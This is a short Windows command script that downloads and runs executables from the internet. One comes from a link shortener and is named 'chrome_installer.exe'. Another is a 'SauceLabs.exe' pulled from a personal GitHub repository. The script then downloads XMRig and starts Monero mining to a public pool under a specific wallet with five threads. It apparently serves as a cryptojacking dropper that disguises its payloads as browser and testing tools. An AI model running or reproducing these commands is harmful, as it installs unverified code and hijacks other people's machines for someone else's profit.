powershell Invoke-WebRequest 'https://is.gd/mUbqFD' -OutFile "C:\Users\Public\Downloads\chrome_installer.exe"
powershell Invoke-Expression "C:\Users\Public\Downloads\chrome_installer.exe"
powershell Invoke-WebRequest -Uri "https://chromedriver.storage.googleapis.com/110.0.5481.77/chromedriver_win32.zip" -OutFile "C:\Users\Public\Downloads\chromedriver_win32.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\chromedriver_win32.zip -DestinationPath C:\Users\Public\Downloads
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
start C:\Users\Public\Downloads\saucelabs.exe
powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o pool.supportxmr.com:3333 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Supp3 -p x -t 5
